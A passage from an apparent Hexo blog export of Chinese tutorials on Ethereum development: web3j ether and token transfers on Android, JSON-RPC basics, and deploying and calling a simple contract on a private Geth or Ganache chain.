<p><a href="https://blog.csdn.net/u013096666/article/details/72639906" target="_blank" rel="noopener">参考2</a></p>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>12、Android通过web3j交易以太坊币</title>
    <url>/%E5%8C%BA%E5%9D%97%E9%93%BE/12%E3%80%81Android%E9%80%9A%E8%BF%87web3j%E4%BA%A4%E6%98%93%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%B8%81/</url>
    <content><![CDATA[<p>为了防止交易重复进行，以太坊要求每笔交易必须有一个nonce数值。nonce值从0开始递增，每发送一笔交易，nonce便加1。</p>
<p>交易处理从nonce值较小的开始，所以nonce的值太大的话，交易会被延迟处理。</p>
<p>如何合理的获取nonce的值：向以太坊节点获取。</p>
<p><a href="https://github.com/web3j/web3j/blob/master/integration-tests/src/test/java/org/web3j/protocol/scenarios/CreateRawTransactionIT.java" target="_blank" rel="noopener">示例代码</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 以太坊交易</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> ExecutionException</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> InterruptedException</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testTransferEther</span><span class="params">()</span> <span class="keyword">throws</span> ExecutionException, InterruptedException </span>&#123;</span><br><span class="line"></span><br><span class="line">       EthCoinbase coinbase = web3j.ethCoinbase().sendAsync().get();</span><br><span class="line"></span><br><span class="line">       <span class="comment">//拨款地址，这里用coinbase账号的地址</span></span><br><span class="line">       <span class="keyword">final</span> String formAddress = coinbase.getAddress();</span><br><span class="line">       <span class="comment">//拨款账号的Key，Key是账号的身份验证，很重要</span></span><br><span class="line">       <span class="keyword">final</span> String formKey = <span class="string">"58e7f34b59a828d1dc37a97a921b55de0cb8cedea91b1e09b490f39264b151ce"</span>;</span><br><span class="line">       <span class="comment">//收款地址</span></span><br><span class="line">       <span class="keyword">final</span> String toAddress = <span class="string">"0x9958eC47C8286DC89F5CbCbD842458bD43540a7D"</span>;</span><br><span class="line"></span><br><span class="line">       EthGetTransactionCount ethGetTransactionCount = web3j.ethGetTransactionCount(</span><br><span class="line">               formAddress, DefaultBlockParameterName.LATEST).sendAsync().get();</span><br><span class="line">       BigInteger nonce = ethGetTransactionCount.getTransactionCount();</span><br><span class="line"></span><br><span class="line">       <span class="comment">//转0.5个以太坊币</span></span><br><span class="line">       BigInteger value = Convert.toWei(<span class="string">"0.5"</span>, Convert.Unit.ETHER).toBigInteger();</span><br><span class="line">       Log.e(TAG, <span class="string">"transaction nonce: "</span> + nonce );</span><br><span class="line"></span><br><span class="line">       RawTransaction rawTransaction = RawTransaction.createEtherTransaction(</span><br><span class="line">                        nonce, GAS_PRICE, GAS_LIMIT, toAddress, value);</span><br><span class="line">       <span class="comment">//签名</span></span><br><span class="line">       Credentials credentials = Credentials.create(formKey);</span><br><span class="line">       <span class="keyword">byte</span>[] signedMessage = TransactionEncoder.signMessage(rawTransaction, credentials);</span><br><span class="line">       String hexValue = Numeric.toHexString(signedMessage);</span><br><span class="line">       <span class="comment">//交易</span></span><br><span class="line">       EthSendTransaction ethSendTransaction = web3j.ethSendRawTransaction(hexValue).sendAsync().get();</span><br><span class="line">       Log.e(TAG, <span class="string">"transactionHash: "</span> + ethSendTransaction.getTransactionHash());</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>参考： <a href="https://mp.weixin.qq.com/s?__biz=MzI0NDAzMzIyNQ==" target="_blank" rel="noopener">以太坊实战之《如何正确处理nonce》</a></p>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>11、JSON-RPC</title>
    <url>/%E5%8C%BA%E5%9D%97%E9%93%BE/11%E3%80%81JSON-RPC/</url>
    <content><![CDATA[<p>我们使用 Js / Java / Go 等语言调用以太坊 <code>ethereum</code> 的服务时，以太坊是通过 <code>JSON-RPC</code>  提供服务的，那么什么是 <code>JSON-RPC</code> ?</p>
<h3 id="JSON-RPC"><a href="#JSON-RPC" class="headerlink" title="JSON-RPC"></a>JSON-RPC</h3><blockquote>
<p>JSON-RPC是一种无状态轻量级远程过程调用（RPC）协议。本规范定义了数据结构及 相应的处理规则。规范本身是传输无关的，可以用于进程内通信、Socket套接字、HTTP 或各种消息通信环境。规范使用JSON（RFC 4627）数据格式。</p>
</blockquote>
<p>相较于一般的 <code>RESTAPI</code> 通过网址（如 GET /user）调用远程服务器，<code>JSON-RPC</code> 直接在内容中定义了欲调用的函数名称，如 {“method”: “getUser”}，<code>JSON-RPC</code>  更加简单和轻量级。</p>
<p>眼下主流语言都已有 <code>JSON-RPC</code> 的实现框架，Java语言中较好的<code>JSON-RPC</code>实现框架有 <code>jsonrpc4j、jpoxy、json-rpc</code>。三者之中 <code>jsonrpc4j</code> 既可独立使用。又可与 <code>spring</code> 无缝集合，比較适合于基于 <code>spring</code>的项目开发。</p>
<h3 id="Ethereum-JSON-RPC"><a href="#Ethereum-JSON-RPC" class="headerlink" title="Ethereum JSON-RPC"></a>Ethereum JSON-RPC</h3><p><code>ethereum</code> 的 <code>JSON-RPC</code> 是通过HTTP传输的，所以查询 <code>web3_clientVersion</code> 可以通过以下命令：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Request</span></span><br><span class="line">curl -X POST --data '&#123;"jsonrpc":"2.0","method":"web3_clientVersion","params":[],"id":67&#125;'</span><br><span class="line"></span><br><span class="line"><span class="comment">// Result</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"id"</span>:<span class="number">67</span>,</span><br><span class="line">  <span class="attr">"jsonrpc"</span>:<span class="string">"2.0"</span>,</span><br><span class="line">  <span class="attr">"result"</span>: <span class="string">"Mist/v0.9.3/darwin/go1.4.1"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>webj</code> 就和 <code>web3.js</code> 等库是对 <code>JSON-RPC</code> 进行封装，方便开发者使用，<a href="https://github.com/ethereum/wiki/wiki/JSON-RPC#web3_clientversion" target="_blank" rel="noopener">文档</a> 。</p>
<h3 id="JSON-RPC-和-REST-的区别"><a href="#JSON-RPC-和-REST-的区别" class="headerlink" title="JSON-RPC 和 REST 的区别"></a>JSON-RPC 和 REST 的区别</h3><p><code>JSON-RPC</code> 在平时开发Web应用时，可以采用 <code>JSON-RPC</code>  ，也可以采用 <code>REST</code> 。</p>
<p>他们各有自己的特点，没有高低之分，只是约定俗成的标准， <code>REST</code>偏向外部调用，<code>JSON-RPC</code> 偏向内部调用采用。</p>
<p><code>RPC</code> 的思想是把本地函数映射到API，也就是说一个API对应的是一个function，对传输协议没有限制，可以是TCP Socket或者HTTP。</p>
<p><code>REST</code> 则不然，它的URL主体是资源，是个名词。仅支持HTTP协议，使用HTTP Method表达动作，类型只有四五种。</p>
<p> <a href="https://segmentfault.com/a/1190000014925173" target="_blank" rel="noopener">《使用golang 实现 JSON-RPC2.0》</a> </p>
<p><a href="https://www.cnblogs.com/clnchanpin/p/7058848.html" target="_blank" rel="noopener">《JSON-RPC轻量级远程调用协议介绍及使用》</a></p>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>1.2、基于Geth部署合约</title>
    <url>/%E5%8C%BA%E5%9D%97%E9%93%BE/1.2%E3%80%81%E5%9F%BA%E4%BA%8EGeth%E9%83%A8%E7%BD%B2%E5%90%88%E7%BA%A6/</url>
    <content><![CDATA[<p>智能合约，我理解它就是程序机器码，可以在区块链上执行的代码，好比 C语言的<code>*.o</code> 文件，Java的 <code>*.class</code> 文件。</p>
<ol>
<li><p>启动 私有链，我们的程序（合约）就跑在这条私有链上。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> geth --datadir data0 --networkid 1108 --nodiscover console</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>查看挖矿账户</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> web3.eth.coinbase </span></span><br><span class="line">"0x5400ca57071e4d804e1d5f7c14f63a70fa90d541"</span><br></pre></td></tr></table></figure>
</li>
<li><p>编写solidity代码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract HelloWorld &#123; </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">uint a</span>) <span class="title">constant</span> <span class="title">returns</span>(<span class="params">uint d</span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> a * <span class="number">8</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>编译为字节码和abi</p>
<p><a href="https://ethereum.github.io/browser-solidity" target="_blank" rel="noopener">在线编译</a> ，<code>compile - Start To compile -&gt; Details</code></p>
<p><code>bytecode</code> 只要 <code>object</code> 的值，abi 全部拷贝。</p>
<blockquote>
<p>注：Details -&gt; web3Deploy有部署的示例，但我们自己手动来一遍。</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> bytecode</span></span><br><span class="line">6060604052341561000f57600080fd5b60b98061001d6000396000f300606060405260043610603f576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806329e99f07146044575b600080fd5b3415604e57600080fd5b606a600480360381019080803590602001909291905050506080565b6040518082815260200191505060405180910390f35b60006008820290509190505600a165627a7a7230582079ee88ca1fe7e781407b09bc2c5497dcabc538d6930265a54386d2b71b0cd7510029</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> abi</span></span><br><span class="line">[</span><br><span class="line">	&#123;</span><br><span class="line">		"constant": true,</span><br><span class="line">		"inputs": [</span><br><span class="line">			&#123;</span><br><span class="line">				"name": "a",</span><br><span class="line">				"type": "uint256"</span><br><span class="line">			&#125;</span><br><span class="line">		],</span><br><span class="line">		"name": "test",</span><br><span class="line">		"outputs": [</span><br><span class="line">			&#123;</span><br><span class="line">				"name": "d",</span><br><span class="line">				"type": "uint256"</span><br><span class="line">			&#125;</span><br><span class="line">		],</span><br><span class="line">		"payable": false,</span><br><span class="line">		"stateMutability": "view",</span><br><span class="line">		"type": "function"</span><br><span class="line">	&#125;</span><br><span class="line">]</span><br><span class="line"><span class="meta">#</span><span class="bash"> abi转义</span></span><br><span class="line">[&#123;\"constant\":true,\"inputs\":[&#123;\"name\":\"a\",\"type\":\"uint256\"&#125;],\"name\":\"test\",\"outputs\":[&#123;\"name\":\"d\",\"type\":\"uint256\"&#125;],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"&#125;]</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建合约对象</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 赋值为本地变量。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 因为是十六进制，加上 0x 赋值给 bytecode</span></span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> bytecode = <span class="string">'0x6060604052341561000f57600080fd5b60b98061001d6000396000f300606060405260043610603f576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806329e99f07146044575b600080fd5b3415604e57600080fd5b606a600480360381019080803590602001909291905050506080565b6040518082815260200191505060405180910390f35b60006008820290509190505600a165627a7a7230582079ee88ca1fe7e781407b09bc2c5497dcabc538d6930265a54386d2b71b0cd7510029'</span></span></span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> abi要解析为对象。</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> var abi = JSON.parse(<span class="string">'[&#123;\"constant\":true,\"inputs\":[&#123;\"name\":\"a\",\"type\":\"uint256\"&#125;],\"name\":\"test\",\"outputs\":[&#123;\"name\":\"d\",\"type\":\"uint256\"&#125;],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"&#125;]'</span>)</span></span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> var helloWorldContract = web3.eth.contract(abi)</span></span><br><span class="line">undefined</span><br></pre></td></tr></table></figure>
</li>
<li><p>预估部署合约的手续费</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> eth.estimateGas(&#123;data: bytecode&#125;)</span></span><br><span class="line">102074</span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看余额，如果账户的余额不够，先挖矿。</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> account1 = web3.eth.coinbase</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> web3.eth.getBalance(account1)</span></span><br><span class="line">600000000000000000000</span><br></pre></td></tr></table></figure>
</li>
<li><p>部署</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 解锁</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> personal.unlockAccount(account1, <span class="string">'123456'</span>) </span></span><br><span class="line">true</span><br><span class="line"><span class="meta">#</span><span class="bash"> 部署，gas 是手续费</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> var helloWorldContractInstance = helloWorldContract.new(&#123;data: bytecode ,gas: 2000000, from: account1&#125;)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 或者带上一个回调函数<span class="keyword">function</span>，用于打印日志</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> var helloWorldContractInstance = helloWorldContract.new(</span></span><br><span class="line">	&#123;</span><br><span class="line">	data: bytecode,</span><br><span class="line">	gas: 2000000,</span><br><span class="line">	from: account1</span><br><span class="line">	&#125;, function (e, contract)&#123;</span><br><span class="line">		console.log(e, contract);</span><br><span class="line">		if (typeof contract.address !== 'undefined') &#123;</span><br><span class="line">			 console.log('Contract mined! address: ' + contract.address + ' transactionHash: ' + contract.transactionHash);</span><br><span class="line">		&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 从<span class="built_in">log</span>看到，合约已经创建</span></span><br><span class="line">INFO [03-30|20:50:12] Submitted contract creation              fullhash=0x583c5c0e6f8c2225cd8411b1ba0a58304505aea929d6c9cd1c0773c952657416 contract=0x05E4898E94785523c6C5AcBa4324B529B5197Bcf</span><br><span class="line">null [object Object]</span><br><span class="line">undefined</span><br></pre></td></tr></table></figure>
</li>
<li><p>合约等待挖矿，开始挖矿</p>
<p>合约需要有节点在挖矿才能部署成功，所以我们先启动挖矿。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> miner.start()</span></span><br><span class="line">INFO [03-30|20:51:30] Updated mining threads                   threads=0</span><br><span class="line">INFO [03-30|20:51:30] Transaction pool price threshold updated price=18000000000</span><br><span class="line">null</span><br><span class="line"><span class="meta">#</span><span class="bash"> 这里等待一会</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> INFO [03-30|20:51:30] Starting mining operation </span></span><br><span class="line">INFO [03-30|20:51:30] Commit new mining work                   number=195 txs=1 uncles=0 elapsed=998.832µs</span><br><span class="line">INFO [03-30|20:51:46] Successfully sealed new block            number=195 hash=d60b89…65bffe</span><br><span class="line">INFO [03-30|20:51:46] 🔗 block reached canonical chain          number=190 hash=4159ba…196761</span><br><span class="line">INFO [03-30|20:51:46] 🔨 mined potential block                  number=195 hash=d60b89…65bffe</span><br><span class="line">INFO [03-30|20:51:46] Commit new mining work                   number=196 txs=0 uncles=0 elapsed=7.087ms</span><br><span class="line">null [object Object]</span><br><span class="line">Contract mined! address: 0x05e4898e94785523c6c5acba4324b529b5197bcf transactionHash: 0x583c5c0e6f8c2225cd8411b1ba0a58304505aea929d6c9cd1c0773c952657416</span><br><span class="line">INFO [03-30|20:51:55] Successfully sealed new block            number=196 hash=f6a947…15b0a4</span><br><span class="line">INFO [03-30|20:51:55] 🔗 block reached canonical chain          number=191 hash=c95b93…bdd2a6</span><br><span class="line">INFO [03-30|20:51:55] 🔨 mined potential block                  number=196 hash=f6a947…15b0a4</span><br><span class="line">INFO [03-30|20:51:55] Commit new mining work                   number=197 txs=0 uncles=0 elapsed=2.289ms</span><br><span class="line"><span class="meta">#</span><span class="bash"> 只要挖矿成功了，就可以停止了</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> miner.stop()</span></span><br><span class="line">true</span><br></pre></td></tr></table></figure>
</li>
<li><p>检查部署结果和调用合约方法</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> helloWorldContractInstance.address</span></span><br><span class="line">"0x05e4898e94785523c6c5acba4324b529b5197bcf"</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> </span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> eth.getCode(helloWorldContractInstance.address)</span></span><br><span class="line">"0x606060405260043610603f576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806329e99f07146044575b600080fd5b3415604e57600080fd5b606a600480360381019080803590602001909291905050506080565b6040518082815260200191505060405180910390f35b60006008820290509190505600a165627a7a7230582079ee88ca1fe7e781407b09bc2c5497dcabc538d6930265a54386d2b71b0cd7510029"</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> </span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> </span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> helloWorldContractInstance.test(4)</span></span><br><span class="line">32</span><br></pre></td></tr></table></figure>
</li>
<li><p>OK</p>
</li>
</ol>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>10、Android调用web3j接口查询余额</title>
    <url>/%E5%8C%BA%E5%9D%97%E9%93%BE/10%E3%80%81Android%E8%B0%83%E7%94%A8web3j%E6%8E%A5%E5%8F%A3%E6%9F%A5%E8%AF%A2%E4%BD%99%E9%A2%9D/</url>
    <content><![CDATA[<h4 id="启动-ganache-gui"><a href="#启动-ganache-gui" class="headerlink" title="启动 ganache-gui"></a>启动 ganache-gui</h4><p>打开就可以了，设置一下HOSTNAME<img src="/images/blockchain/ganache_conf.png" alt="ganache_conf.png"></p>
<h4 id="API"><a href="#API" class="headerlink" title="API"></a>API</h4><figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">implementation (<span class="string">'org.web3j:core:3.3.1-android'</span>)</span><br></pre></td></tr></table></figure>
<p>这个库完全实现了以太坊的 <code>Json-RPC</code> 客户端的协议，包含HTTP和IPC，我们就用HTTP的就可以了， <a href="https://github.com/ethereum/wiki/wiki/JSON-RPC#eth_sendtransaction" target="_blank" rel="noopener">Documentation</a> 。</p>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><p>直接贴 <code>Web3j</code> 的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Web3j web3 =  Web3jFactory.build(<span class="keyword">new</span> HttpService(<span class="string">"http://192.168.0.92:7545"</span>));</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Web3ClientVersion web3ClientVersion = web3.web3ClientVersion().sendAsync().get();</span><br><span class="line">        String clientVersion = web3ClientVersion.getWeb3ClientVersion();</span><br><span class="line"></span><br><span class="line">        Log.e(TAG, <span class="string">"clientVersion: "</span>+clientVersion);</span><br><span class="line"></span><br><span class="line">        EthCoinbase coinbase = web3.ethCoinbase().sendAsync().get();</span><br><span class="line">        String address = coinbase.getAddress();</span><br><span class="line">        Log.e(TAG, <span class="string">"coinbase address: "</span> + address );</span><br><span class="line"></span><br><span class="line">        EthBlockNumber blockNumber = web3.ethBlockNumber().sendAsync().get();</span><br><span class="line">        Log.e(TAG, <span class="string">"BlockNumber: "</span>+blockNumber.getBlockNumber() );</span><br><span class="line"></span><br><span class="line">        BigInteger balance = web3.ethGetBalance(address, DefaultBlockParameterName.LATEST).sendAsync().get().getBalance();</span><br><span class="line"></span><br><span class="line">        Log.e(TAG, <span class="string">"balance :"</span> + balance.toString());</span><br><span class="line">        Log.e(TAG, <span class="string">"balance getLowestSetBit:"</span> + balance.getLowestSetBit());</span><br><span class="line">        Log.e(TAG, <span class="string">"balance longValue:"</span> + balance.longValue());</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ExecutionException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>13、Android通过web3j交易代币</title>
    <url>/%E5%8C%BA%E5%9D%97%E9%93%BE/13%E3%80%81Android%E9%80%9A%E8%BF%87web3j%E4%BA%A4%E6%98%93%E4%BB%A3%E5%B8%81/</url>
    <content><![CDATA[<h3 id="测试“生成合约的Java代码”环境"><a href="#测试“生成合约的Java代码”环境" class="headerlink" title="测试“生成合约的Java代码”环境"></a>测试“生成合约的Java代码”环境</h3><p>下载<a href="https://github.com/web3j/web3j/releases/download/v3.4.0/web3j-3.4.0.zip" target="_blank" rel="noopener">web3j-3.4.0</a><br>解压目录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── bin</span><br><span class="line">│   ├── web3j</span><br><span class="line">│   └── web3j.bat</span><br><span class="line">└── lib</span><br></pre></td></tr></table></figure>
<p>进入bin目录，编写一个测试合约代码 SimpleStorage.sol</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.17</span>;</span><br><span class="line"></span><br><span class="line">contract SimpleStorage &#123;</span><br><span class="line">	uint storedData;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params">uint x</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">	storedData = x;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> storedData;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行以下命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> npm install -g solc@0.4.17</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> solcjs SimpleStorage.sol   --optimize  --bin --abi</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./web3j solidity generate SimpleStorage_sol_SimpleStorage.bin SimpleStorage_sol_SimpleStorage.abi -o ./ -p com.github.contract</span></span><br></pre></td></tr></table></figure>
<p>如果生成成功的话，在目录下就有代码文件了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.github.contract;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"><span class="keyword">import</span> org.web3j.abi.TypeReference;</span><br><span class="line"><span class="keyword">import</span> org.web3j.abi.datatypes.Function;</span><br><span class="line"><span class="keyword">import</span> org.web3j.abi.datatypes.Type;</span><br><span class="line"><span class="keyword">import</span> org.web3j.abi.datatypes.generated.Uint256;</span><br><span class="line"><span class="keyword">import</span> org.web3j.crypto.Credentials;</span><br><span class="line"><span class="keyword">import</span> org.web3j.protocol.Web3j;</span><br><span class="line"><span class="keyword">import</span> org.web3j.protocol.core.RemoteCall;</span><br><span class="line"><span class="keyword">import</span> org.web3j.protocol.core.methods.response.TransactionReceipt;</span><br><span class="line"><span class="keyword">import</span> org.web3j.tx.Contract;</span><br><span class="line"><span class="keyword">import</span> org.web3j.tx.TransactionManager;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;Auto generated code.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;strong&gt;Do not modify!&lt;/strong&gt;</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;Please use the &lt;a href="https://docs.web3j.io/command_line.html"&gt;web3j command line tools&lt;/a&gt;,</span></span><br><span class="line"><span class="comment"> * or the org.web3j.codegen.SolidityFunctionWrapperGenerator in the </span></span><br><span class="line"><span class="comment"> * &lt;a href="https://github.com/web3j/web3j/tree/master/codegen"&gt;codegen module&lt;/a&gt; to update.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;Generated with web3j version 3.4.0.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SimpleStorage_sol_SimpleStorage</span> <span class="keyword">extends</span> <span class="title">Contract</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String BINARY = <span class="string">"608060405234801561001057600080fd5b5060be8061001f6000396000f3fe6080604052348015600f57600080fd5b5060043610604e577c0100000000000000000000000000000000000000000000000000000000600035046360fe47b1811460535780636d4ce63c14606f575b600080fd5b606d60048036036020811015606757600080fd5b50356087565b005b6075608c565b60408051918252519081900360200190f35b600055565b6000549056fea165627a7a72305820e5e4aaf9332912cc735c414d20ef297bee7a95d95f6c63801cb3c4c94a6542cd0029"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String FUNC_SET = <span class="string">"set"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String FUNC_GET = <span class="string">"get"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">SimpleStorage_sol_SimpleStorage</span><span class="params">(String contractAddress, Web3j web3j, Credentials credentials, BigInteger gasPrice, BigInteger gasLimit)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(BINARY, contractAddress, web3j, credentials, gasPrice, gasLimit);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">SimpleStorage_sol_SimpleStorage</span><span class="params">(String contractAddress, Web3j web3j, TransactionManager transactionManager, BigInteger gasPrice, BigInteger gasLimit)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(BINARY, contractAddress, web3j, transactionManager, gasPrice, gasLimit);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> RemoteCall&lt;TransactionReceipt&gt; <span class="title">set</span><span class="params">(BigInteger x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> Function function = <span class="keyword">new</span> Function(</span><br><span class="line">                FUNC_SET, </span><br><span class="line">                Arrays.&lt;Type&gt;asList(<span class="keyword">new</span> org.web3j.abi.datatypes.generated.Uint256(x)), </span><br><span class="line">                Collections.&lt;TypeReference&lt;?&gt;&gt;emptyList());</span><br><span class="line">        <span class="keyword">return</span> executeRemoteCallTransaction(function);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> RemoteCall&lt;BigInteger&gt; <span class="title">get</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> Function function = <span class="keyword">new</span> Function(FUNC_GET, </span><br><span class="line">                Arrays.&lt;Type&gt;asList(), </span><br><span class="line">                Arrays.&lt;TypeReference&lt;?&gt;&gt;asList(<span class="keyword">new</span> TypeReference&lt;Uint256&gt;() &#123;&#125;));</span><br><span class="line">        <span class="keyword">return</span> executeRemoteCallSingleValueReturn(function, BigInteger<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> RemoteCall&lt;SimpleStorage_sol_SimpleStorage&gt; <span class="title">deploy</span><span class="params">(Web3j web3j, Credentials credentials, BigInteger gasPrice, BigInteger gasLimit)</span> </span>&#123;</span><br><span class="line">        return deployRemoteCall(SimpleStorage_sol_SimpleStorage.class, web3j, credentials, gasPrice, gasLimit, BINARY, "");</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> RemoteCall&lt;SimpleStorage_sol_SimpleStorage&gt; <span class="title">deploy</span><span class="params">(Web3j web3j, TransactionManager transactionManager, BigInteger gasPrice, BigInteger gasLimit)</span> </span>&#123;</span><br><span class="line">        return deployRemoteCall(SimpleStorage_sol_SimpleStorage.class, web3j, transactionManager, gasPrice, gasLimit, BINARY, "");</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> SimpleStorage_sol_SimpleStorage <span class="title">load</span><span class="params">(String contractAddress, Web3j web3j, Credentials credentials, 